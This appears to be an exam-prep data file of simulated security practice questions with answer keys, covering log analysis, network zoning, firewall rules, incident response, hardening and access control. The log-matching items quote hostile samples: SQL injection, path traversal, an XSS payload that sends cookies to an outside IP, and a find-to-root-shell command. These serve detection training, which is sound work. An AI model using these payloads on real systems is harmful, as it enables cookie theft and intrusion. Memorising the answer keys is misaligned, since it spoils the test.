/**
 * Simulated performance-based questions (PBQs). Original, exam-inspired tasks —
 * not reproductions of real exam items.
 */
import type { ObjectiveId, SortVisual } from '@/types/content';
import type { ClassifyItem } from '@/components/labs/kit';
import type { Task } from '@/components/labs/FirewallLab';

interface Base {
  id: string;
  title: string;
  objectives: ObjectiveId[];
  minutes: number;
  brief: string;
  icon: string;
}

export type PBQ =
  | (Base & { kind: 'table'; items: ClassifyItem[] })
  | (Base & { kind: 'sort'; sort: SortVisual })
  | (Base & { kind: 'order'; steps: { text: string; why: string }[] })
  | (Base & { kind: 'firewall'; task: Task });

const ATTACKS = ['SQL injection', 'Cross-site scripting', 'Directory traversal', 'Password spraying', 'Brute force', 'DNS amplification (reflected DDoS)', 'On-path (ARP poisoning)', 'Privilege escalation'];
const CERT_FIX = ['Renew the certificate', 'Install the intermediate certificate on the server', 'Issue a certificate whose SAN covers the name', 'Distribute the internal root CA to client trust stores', 'Revoke and reissue with a new key pair', 'Generate a new CSR on the server that holds the private key'];
const CAT = ['Technical', 'Managerial', 'Operational', 'Physical'];
const TYPE = ['Preventive', 'Deterrent', 'Detective', 'Corrective', 'Compensating', 'Directive'];

export const PBQS: PBQ[] = [
  {
    id: 'pbq-attack-logs', kind: 'table', title: 'Identify attacks from log excerpts', objectives: ['2.4', '4.9'], minutes: 8, icon: 'file-search',
    brief: 'You are reviewing logs collected by the SIEM. Match each excerpt to the attack it shows.',
    items: [
      { prompt: 'Web server access log', exhibit: '10.20.4.7 - - "GET /products.php?id=1%27%20OR%20%271%27=%271%27--%20 HTTP/1.1" 200 51213', fields: [{ label: 'Attack', options: ATTACKS, answer: 0 }], explain: "URL-decoded, the parameter is `1' OR '1'='1'--` — classic SQL injection forcing a true condition. The unusually large 200 response suggests it worked." },
      { prompt: 'Web server access log', exhibit: '203.0.113.9 - - "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2231', fields: [{ label: 'Attack', options: ATTACKS, answer: 2 }], explain: '`../` sequences climb out of the web root to read system files — directory (path) traversal.' },
      { prompt: 'Web application log', exhibit: 'POST /comments body="Great post!<script>fetch(\'https://203.0.113.50/c?\'+document.cookie)</script>"', fields: [{ label: 'Attack', options: ATTACKS, answer: 1 }], explain: 'Injected script that runs in other visitors’ browsers and sends their cookies away — stored XSS.' },
      { prompt: 'Identity provider log (5 minutes)', exhibit: 'FAIL user=alice src=198.51.100.4  pw=Winter2026!\nFAIL user=bob   src=198.51.100.4  pw=Winter2026!\nFAIL user=chen  src=198.51.100.4  pw=Winter2026!\nFAIL user=dana  src=198.51.100.4  pw=Winter2026!\nSUCCESS user=eli src=198.51.100.4', fields: [{ label: 'Attack', options: ATTACKS, answer: 3 }], explain: 'One common password tried against many accounts — spraying, which stays under per-account lockout thresholds.' },
      { prompt: 'Identity provider log (2 minutes)', exhibit: 'FAIL user=admin src=203.0.113.77 (attempt 1)\nFAIL user=admin src=203.0.113.77 (attempt 2)\n...\nFAIL user=admin src=203.0.113.77 (attempt 4,812)\nACCOUNT_LOCKED user=admin', fields: [{ label: 'Attack', options: ATTACKS, answer: 4 }], explain: 'Thousands of guesses against ONE account → brute force, stopped by lockout.' },
      { prompt: 'Edge router NetFlow summary', exhibit: 'src=* (8,400 open resolvers) sport=53 → dst=198.51.100.10 (victim)\nproto=UDP avg_size=3,900 bytes  rate=41 Gbps\nqueries observed from victim: none', fields: [{ label: 'Attack', options: ATTACKS, answer: 5 }], explain: 'Huge DNS responses from thousands of resolvers to a victim that never asked — spoofed queries reflected and amplified.' },
      { prompt: 'Switch / endpoint ARP table', exhibit: '10.0.0.1  (gateway)  00-1a-2b-3c-4d-5e  → changed to 00-0c-29-aa-bb-cc\n10.0.0.57 (WS-057)   00-0c-29-aa-bb-cc', fields: [{ label: 'Attack', options: ATTACKS, answer: 6 }], explain: 'The gateway’s IP now maps to a workstation’s MAC: ARP poisoning puts WS-057 on-path between victims and the gateway.' },
      { prompt: 'Linux auth log', exhibit: 'www-data : COMMAND=/usr/bin/find . -exec /bin/sh -p \\; -quit\nuid=33(www-data) euid=0(root)', fields: [{ label: 'Attack', options: ATTACKS, answer: 7 }], explain: 'A web-service account abuses a misconfigured binary to obtain an effective UID of 0 (root) — privilege escalation.' },
    ],
  },
  {
    id: 'pbq-placement', kind: 'sort', title: 'Place network appliances in the right zone', objectives: ['3.2'], minutes: 6, icon: 'network',
    brief: 'A company is redesigning its network. Place each component in the zone where it belongs.',
    sort: {
      kind: 'sort', title: 'Secure network design', prompt: 'Place each device in the zone it belongs to.',
      bins: ['Internet edge', 'Screened subnet (DMZ)', 'Internal LAN', 'Restricted / data zone'],
      items: [
        { text: 'Web application firewall', bin: 'Internet edge', why: 'Inspects HTTP(S) before it reaches the web tier — sits in front of the web servers.' },
        { text: 'Public web server', bin: 'Screened subnet (DMZ)', why: 'Internet-facing services live in the DMZ.' },
        { text: 'VPN concentrator', bin: 'Screened subnet (DMZ)', why: 'Remote access terminates at the edge/DMZ before entering the LAN.' },
        { text: 'Mail relay (SMTP gateway)', bin: 'Screened subnet (DMZ)', why: 'Accepts mail from the Internet without exposing internal mail servers.' },
        { text: 'Employee workstations', bin: 'Internal LAN', why: 'User endpoints belong on the internal network.' },
        { text: 'Forward proxy for user web browsing', bin: 'Internal LAN', why: 'Filters outbound user traffic; placed where users are (or the DMZ).' },
        { text: 'Customer database', bin: 'Restricted / data zone', why: 'Sensitive data goes in the most restricted segment.' },
        { text: 'Hardware security module (HSM)', bin: 'Restricted / data zone', why: 'Key material is protected deep inside the network.' },
      ],
    },
  },
  {
    id: 'pbq-firewall-mail', kind: 'firewall', title: 'Configure firewall rules for a mail service', objectives: ['4.5', '3.2'], minutes: 10, icon: 'firewall',
    brief: 'Write an ordered rule base that meets every requirement. The firewall is stateless and first-match, with an implicit deny.',
    task: {
      title: 'Mail and webmail rules',
      brief: ['Allow SMTP (TCP 25) from anywhere to the mail relay 10.1.1.25.', 'Allow IMAPS (TCP 993) to the mail server 10.1.2.30 only from internal clients 10.1.0.0/16.', 'Allow HTTPS (TCP 443) from anywhere to webmail 10.1.1.80.', 'Block plaintext IMAP (TCP 143) everywhere. Deny everything else.'],
      start: [],
      tests: [
        { p: { proto: 'tcp', src: '198.51.100.20', dst: '10.1.1.25', port: 25 }, expect: 'allow', why: 'Inbound mail.' },
        { p: { proto: 'tcp', src: '10.1.7.40', dst: '10.1.2.30', port: 993 }, expect: 'allow', why: 'Internal client IMAPS.' },
        { p: { proto: 'tcp', src: '198.51.100.20', dst: '10.1.2.30', port: 993 }, expect: 'deny', why: 'External IMAPS to the internal mail server.' },
        { p: { proto: 'tcp', src: '203.0.113.4', dst: '10.1.1.80', port: 443 }, expect: 'allow', why: 'Webmail.' },
        { p: { proto: 'tcp', src: '10.1.7.40', dst: '10.1.2.30', port: 143 }, expect: 'deny', why: 'Plaintext IMAP.' },
        { p: { proto: 'tcp', src: '203.0.113.4', dst: '10.1.1.25', port: 22 }, expect: 'deny', why: 'SSH was not requested.' },
      ],
    },
  },
  {
    id: 'pbq-ir-order', kind: 'order', title: 'Sequence the response to a compromised server', objectives: ['4.8'], minutes: 6, icon: 'siren',
    brief: 'An EDR alert shows a web server running an unknown process that is beaconing out. Put the actions in the order you should perform them.',
    steps: [
      { text: 'Validate the alert and determine scope from EDR, firewall and DNS logs', why: 'Confirm it is a real incident and how far it reaches (detection & analysis).' },
      { text: 'Isolate the server from the network (keep it powered on)', why: 'Containment stops spread and C2 while preserving volatile memory.' },
      { text: 'Capture memory and a forensic disk image; record hashes and chain of custody', why: 'Acquire evidence before anything is changed — order of volatility.' },
      { text: 'Identify the root cause (e.g. the unpatched plugin that was exploited)', why: 'You can’t eradicate what you don’t understand.' },
      { text: 'Remove the malware, patch the vulnerability and rotate exposed credentials', why: 'Eradication removes the cause and the attacker’s access.' },
      { text: 'Restore the server from a known-good image and monitor closely', why: 'Recovery returns it to service with heightened monitoring.' },
      { text: 'Hold a lessons-learned review and update detections and playbooks', why: 'Improves preparation for next time.' },
    ],
  },
  {
    id: 'pbq-wireless', kind: 'table', title: 'Configure a secure enterprise wireless network', objectives: ['4.1', '3.2'], minutes: 6, icon: 'wifi',
    brief: 'Configure the corporate WLAN for 800 employees and a separate guest network. Choose the most secure appropriate setting for each field.',
    items: [
      { prompt: 'Corporate SSID — security protocol', fields: [{ label: 'Setting', options: ['WEP', 'WPA2-Personal (PSK)', 'WPA3-Enterprise', 'Open'], answer: 2 }], explain: 'Enterprise mode authenticates each user via 802.1X; WPA3 adds stronger crypto and mandatory management-frame protection.' },
      { prompt: 'Corporate SSID — authentication', fields: [{ label: 'Setting', options: ['Shared passphrase', '802.1X with EAP-TLS via RADIUS', 'MAC filtering only', 'Captive portal'], answer: 1 }], explain: 'EAP-TLS uses certificates — no shared secret to leak, resistant to phishing.' },
      { prompt: 'Corporate SSID — encryption', fields: [{ label: 'Setting', options: ['TKIP', 'AES (CCMP/GCMP)', 'RC4', 'None'], answer: 1 }], explain: 'AES-based CCMP/GCMP; TKIP and RC4 are deprecated.' },
      { prompt: 'Wi-Fi Protected Setup (WPS)', fields: [{ label: 'Setting', options: ['Enabled (PIN)', 'Enabled (push button)', 'Disabled'], answer: 2 }], explain: 'WPS PINs are brute-forceable; disable WPS on enterprise networks.' },
      { prompt: 'Guest SSID — network placement', fields: [{ label: 'Setting', options: ['Same VLAN as employees', 'Separate VLAN with Internet-only access and client isolation', 'Bridged to the server VLAN'], answer: 1 }], explain: 'Segment guests from corporate resources and from each other.' },
      { prompt: 'Guest SSID — security', fields: [{ label: 'Setting', options: ['Open with no encryption', 'WPA3-Personal (SAE) or OWE with a captive portal', 'WEP'], answer: 1 }], explain: 'SAE (or Opportunistic Wireless Encryption) encrypts guest traffic; a captive portal handles terms of use.' },
      { prompt: 'Before deployment: how do you place the access points?', fields: [{ label: 'Setting', options: ['Max transmit power everywhere', 'Site survey with heat maps', 'One AP per floor in the middle'], answer: 1 }], explain: 'A site survey and heat map show coverage, interference and leakage outside the building.' },
    ],
  },
  {
    id: 'pbq-certs', kind: 'table', title: 'Troubleshoot certificate errors', objectives: ['1.4'], minutes: 6, icon: 'cert',
    brief: 'Users report TLS warnings. Choose the fix for each problem.',
    items: [
      { prompt: 'NET::ERR_CERT_DATE_INVALID on the public store — “Not After” was yesterday.', fields: [{ label: 'Fix', options: CERT_FIX, answer: 0 }], explain: 'Expired — renew it (and automate renewal).' },
      { prompt: 'Mobile apps fail but desktop browsers work; the server only sends the leaf certificate.', fields: [{ label: 'Fix', options: CERT_FIX, answer: 1 }], explain: 'Incomplete chain. Desktop browsers may cache/fetch intermediates; many clients won’t.' },
      { prompt: 'The certificate is *.example.com but users visit mail.corp.example.com.', fields: [{ label: 'Fix', options: CERT_FIX, answer: 2 }], explain: 'A wildcard covers one label only. Add the name to the SAN (or a *.corp.example.com certificate).' },
      { prompt: 'An internal HR portal uses a certificate from the company’s private CA; managed laptops show “untrusted issuer”.', fields: [{ label: 'Fix', options: CERT_FIX, answer: 3 }], explain: 'Push the internal root certificate to managed devices (e.g. via Group Policy/MDM).' },
      { prompt: 'The web server’s private key was found in a public code repository.', fields: [{ label: 'Fix', options: CERT_FIX, answer: 4 }], explain: 'Key compromise: revoke (so CRL/OCSP report it) and issue a new certificate with a new key pair.' },
      { prompt: 'An admin generated a CSR on their laptop, got it signed, and now the server says the key doesn’t match.', fields: [{ label: 'Fix', options: CERT_FIX, answer: 5 }], explain: 'The private key stays where the CSR was created. Generate the CSR on the server (or import the matching key securely).' },
    ],
  },
  {
    id: 'pbq-controls', kind: 'table', title: 'Classify security controls', objectives: ['1.1'], minutes: 5, icon: 'shield-half',
    brief: 'An auditor asks you to classify each control by category and type.',
    items: [
      { prompt: 'Motion-activated floodlights around the loading dock', fields: [{ label: 'Category', options: CAT, answer: 3 }, { label: 'Type', options: TYPE, answer: [1, 2] }], explain: 'Physical; lighting deters (and motion activation can help detection).' },
      { prompt: 'Quarterly access recertification performed by managers', fields: [{ label: 'Category', options: CAT, answer: [1, 2] }, { label: 'Type', options: TYPE, answer: 2 }], explain: 'A review that finds inappropriate access — detective; managerial oversight or operational routine.' },
      { prompt: 'Host-based firewall blocking inbound SMB', fields: [{ label: 'Category', options: CAT, answer: 0 }, { label: 'Type', options: TYPE, answer: 0 }], explain: 'Technical preventive.' },
      { prompt: 'Reimaging a ransomware-infected laptop', fields: [{ label: 'Category', options: CAT, answer: [0, 2] }, { label: 'Type', options: TYPE, answer: 3 }], explain: 'Corrective.' },
      { prompt: 'Data-handling policy requiring encryption of exports', fields: [{ label: 'Category', options: CAT, answer: 1 }, { label: 'Type', options: TYPE, answer: 5 }], explain: 'Managerial directive.' },
      { prompt: 'Extra logging and isolation for a system that can’t be upgraded', fields: [{ label: 'Category', options: CAT, answer: 0 }, { label: 'Type', options: TYPE, answer: 4 }], explain: 'Technical compensating.' },
    ],
  },
  {
    id: 'pbq-risk-register', kind: 'table', title: 'Complete a risk register', objectives: ['5.2'], minutes: 8, icon: 'calculator',
    brief: 'Calculate each risk’s ALE and choose the treatment that best fits the stated constraints.',
    items: [
      { prompt: 'R1 — Flood at the data center. Asset value $2,000,000, EF 50%, expected once every 20 years. A second site would cost $400,000/year.', fields: [{ label: 'ALE', options: ['$50,000', '$100,000', '$1,000,000', '$20,000'], answer: 0 }, { label: 'Treatment', options: ['Avoid', 'Mitigate with a second site', 'Transfer (flood insurance)', 'Accept'], answer: 2 }], explain: 'SLE $1,000,000 × ARO 0.05 = $50,000. A $400k control is uneconomic; insurance transfers the financial impact.' },
      { prompt: 'R2 — Laptop theft. AV $2,500 per laptop, EF 100%, ~10 per year. Full-disk encryption + tracking costs $6,000/year and mainly removes the data-breach impact.', fields: [{ label: 'ALE (hardware only)', options: ['$2,500', '$25,000', '$250,000', '$6,000'], answer: 1 }, { label: 'Treatment', options: ['Avoid laptops entirely', 'Mitigate (encryption, tracking)', 'Transfer', 'Accept'], answer: 1 }], explain: 'ALE = $2,500 × 10 = $25,000, and a breach of unencrypted data would cost far more — mitigate.' },
      { prompt: 'R3 — A proposed public API would expose sensitive data the business doesn’t really need to publish.', fields: [{ label: 'ALE', options: ['Not calculable here', '$0', '$1', '$10'], answer: 0 }, { label: 'Treatment', options: ['Avoid (don’t launch it)', 'Mitigate', 'Transfer', 'Accept'], answer: 0 }], explain: 'If the activity isn’t needed, avoiding it removes the risk entirely.' },
      { prompt: 'R4 — Website defacement. SLE $3,000, ARO 0.5. Fix would cost $20,000/year. Within risk appetite.', fields: [{ label: 'ALE', options: ['$1,500', '$6,000', '$3,000', '$20,000'], answer: 0 }, { label: 'Treatment', options: ['Avoid', 'Mitigate', 'Transfer', 'Accept'], answer: 3 }], explain: 'ALE $1,500 vs a $20,000 control and within appetite → accept (documented by the risk owner).' },
    ],
  },
  {
    id: 'pbq-hardening', kind: 'table', title: 'Harden a new Linux web server', objectives: ['4.1', '2.5'], minutes: 6, icon: 'server-cog',
    brief: 'A new Internet-facing server is about to go live. Choose the secure baseline setting for each item.',
    items: [
      { prompt: 'SSH: root login', fields: [{ label: 'Setting', options: ['Allowed with password', 'Disabled (use named accounts + sudo)', 'Allowed with key'], answer: 1 }], explain: 'Named accounts give accountability; disabling root login removes the most-targeted account.' },
      { prompt: 'SSH: authentication method', fields: [{ label: 'Setting', options: ['Password', 'Public key (with MFA for admins)', 'None'], answer: 1 }], explain: 'Keys resist password guessing and spraying.' },
      { prompt: 'Telnet and FTP services', fields: [{ label: 'Setting', options: ['Leave installed but stopped', 'Remove the packages', 'Run on non-standard ports'], answer: 1 }], explain: 'Remove unnecessary software — it reduces attack surface and patching burden.' },
      { prompt: 'Host-based firewall', fields: [{ label: 'Setting', options: ['Disabled (network firewall is enough)', 'Default deny inbound; allow 443 and SSH from the admin subnet', 'Allow all'], answer: 1 }], explain: 'Defense in depth: the host enforces least privilege even if the network fails.' },
      { prompt: 'Vendor default admin account on the web control panel', fields: [{ label: 'Setting', options: ['Keep default password for support', 'Change the password', 'Disable/rename it and create named admin accounts'], answer: 2 }], explain: 'Default credentials are a top attack vector; remove the default account where possible.' },
      { prompt: 'Logs', fields: [{ label: 'Setting', options: ['Keep locally only', 'Forward to the SIEM with time sync (NTP)', 'Disable to save disk'], answer: 1 }], explain: 'Central, time-synchronised logs survive tampering and support investigations.' },
      { prompt: 'Patching', fields: [{ label: 'Setting', options: ['Patch annually', 'Apply current patches before go-live and enrol in patch management', 'Never patch production'], answer: 1 }], explain: 'Go live from a patched baseline and keep it maintained.' },
    ],
  },
  {
    id: 'pbq-access', kind: 'table', title: 'Grant access with least privilege', objectives: ['4.6', '2.5'], minutes: 6, icon: 'user-check',
    brief: 'Review each access request and choose the response that follows least privilege and good IAM practice.',
    items: [
      { prompt: 'A help-desk technician needs to reset users’ passwords.', fields: [{ label: 'Decision', options: ['Grant Domain Admin', 'Grant the delegated “password reset” role only', 'Deny'], answer: 1 }], explain: 'Give exactly the permission needed — delegated role, not full admin.' },
      { prompt: 'A DBA needs production database admin rights for a 2-hour maintenance window tonight.', fields: [{ label: 'Decision', options: ['Permanent DB admin rights', 'Just-in-time elevation via PAM for the window', 'Share the service account password'], answer: 1 }], explain: 'JIT/ephemeral privileges expire automatically; PAM records the session.' },
      { prompt: 'A contractor’s project ended yesterday; their account is still active.', fields: [{ label: 'Decision', options: ['Leave it in case they return', 'Disable/deprovision immediately', 'Change the password and keep it'], answer: 1 }], explain: 'Deprovision promptly at the end of the engagement.' },
      { prompt: 'An employee moving from Sales to Finance asks to keep CRM admin “just in case”.', fields: [{ label: 'Decision', options: ['Keep both role sets', 'Remove Sales access and assign the Finance role', 'Grant everything to save time'], answer: 1 }], explain: 'Prevent privilege creep on role changes.' },
      { prompt: 'A developer wants the production database password to debug an issue.', fields: [{ label: 'Decision', options: ['Email it to them', 'Provide masked/test data in a non-production environment', 'Post it in the team wiki'], answer: 1 }], explain: 'Use non-production with masked data; production secrets stay vaulted.' },
      { prompt: 'Shared “admin” account used by five engineers on network devices.', fields: [{ label: 'Decision', options: ['Keep sharing; it’s convenient', 'Give each engineer a named account via RADIUS/TACACS+ and vault the local admin', 'Rotate the shared password yearly'], answer: 1 }], explain: 'Named accounts provide accountability (AAA); the local fallback credential lives in a vault.' },
    ],
  },
];

export const PBQ_BY_ID = Object.fromEntries(PBQS.map((p) => [p.id, p]));
